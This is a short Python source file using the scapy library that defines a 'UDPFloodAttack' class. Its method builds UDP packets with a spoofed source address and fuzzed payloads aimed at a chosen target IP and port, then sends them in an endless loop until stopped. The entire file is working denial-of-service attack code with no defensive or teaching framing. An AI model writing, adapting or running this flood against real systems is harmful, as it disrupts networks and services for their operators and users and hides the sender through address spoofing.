from scapy.all import *

class UDPFloodAttack(object):

    def sendUDPPackets(self, targetIP, targetPort):

        """
        Name: Send UDP Packets Function
        Type: void
        Description: This function takes in the targetIP, and targetPort. With this information
                    this function will then set up an infinite loop which the sending of UDP packets
                    filled with data will occur till the program is stopped or the connection is lost.
        """

        #Creating a UDP Packet with a Spoofed IP and specific targetIP and targetPort
        packetUDP = IP(src="1.1.1.1", dst=targetIP)/fuzz(UDP(dport=targetPort))/fuzz(Raw())

        #Sending n amounts of packets
        while True:
            send(packetUDP)
